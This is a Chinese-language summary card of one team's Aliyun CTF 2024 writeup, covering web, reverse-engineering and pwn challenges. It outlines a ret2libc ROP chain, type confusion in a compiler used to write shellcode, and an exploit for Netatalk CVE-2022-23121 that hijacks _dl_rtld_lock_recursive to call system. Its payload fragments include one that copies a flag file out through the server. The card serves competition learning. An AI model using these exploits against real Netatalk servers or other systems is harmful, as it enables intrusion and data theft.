---
title: "阿里云CTF 2024 writeup"
category: web
tags: ["阿里云CTF", "web", "Web-Pastbin", "并发-Go-routine", "Go-Router", "MIME+skip中间件"]
signals: ["阿里云CTF 2024", "Web-Pastbin", "并发-Go-routine", "Go-Router", "MIME+skip中间件", "Re-欧拉图dfs+约束", "easyCAS", "ASLR-CAS", "Pwn-0x2d44溢出+ret2libc", "shellcode", "CTF", "El3ctronic", "web", "Pastbin"]
difficulty: hard
source: "https://www.ctfiot.com/170638.html"
tools: ["Go", "ROP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 阿里云CTF 2024 writeup

> 赛事：阿里云CTF 2024 | 方向：web | 难度：hard | 工具：Go、ROP

## 一句话总结

阿里云CTF 2024 El3ctronic战队第四名全方向:web签到Pastbin+easyCAS+Re欧拉+sign_in溢出ret2libc+klang编译器fuzz类型混淆写shellcode+Netatalk CVE-2022-23121 AppleDouble改_dl_rtld_lock_recursive=system

## 攻击链

1. web签到: 抓包+decode+转base64+加hash(.)submit token|easyCAS: Go协程+64+32 limiter+多线程爆破|Pastbin: handle(mws=append(c.mws, getMWFromHandler(h)))+route越权|Re-欧拉: 邻接矩阵dfs+17节点+约束flag[14]=7+flag[17]=4|Pwn sign_in: 0x2d44 read(0x500)溢出c0(0x300)覆盖ptr,write_got leak libc,ROP __free_hook+open flag|klang: get_int+arb_read+arb_write+array_new fuzz类型混淆,写shellcode到栈+劫持puts_got|Netatalk: FPOpenFork(flag=2)打开test_file,AppleDouble header ADEID_FINDERI偏移0x32+memcpy+memmove改_dl_rtld_lock_recursive=system+_dl_load_lock=cmd

## 关键 payload

```
data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn0seyJuYW1lIjoiZmxhZyIsInZhbHVlIjoib24ifV0=|/flag flag{70c6a4340c6c5bb3b0b34a8caa9a872f}|payload = b''a''*0x88 + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(write_got)*2 + p64(write_plt) + p64(0x4005BD)|get_int/arb_read/arb_write/array_new fuzz|createAppleDouble_leak: pack(0x7fa,32,''big'',True) + p32(0x100)|createAppleDouble_write: pack(0x4504,32,''big'',True) + ''cat /flag.txt > /home/xxxx/shared/flag\x00''.ljust(0x32c) + p32(system)
```

## 经验教训

1) easyCAS Go并发限流:limiter1+limiter2+go func+select{};2) Pastbin Router handle append mws中间件链;3) 欧拉图dfs:邻接矩阵e[u][v]!use[u][v]+约束;4) 0x2d44 read(0x500)溢出c0(0x300)覆盖ptr:write_got leak→ROP;5) klang编译器fuzz类型混淆:int/string/array混用→写shellcode到栈+puts_got hijack;6) Netatalk CVE-2022-23121:FPOpenFork flag=2+AppleDouble ADEID_FINDERI偏移0x32+memmove改_dl_rtld_lock_recursive

## 标签

Web-Pastbin、并发-Go-routine、Go-Router、MIME+skip中间件、Re-欧拉图dfs+约束、easyCAS、ASLR-CAS、Pwn-0x2d44溢出+ret2libc、klang编译器漏洞、Netatalk-CVE-2022-23121、AppleDouble-header、FPOpenFork、_dl_rtld_lock_recursive

## 参考来源

- https://www.ctfiot.com/170638.html
- 原文件：阿里云CTF_2024_writeup.full.md
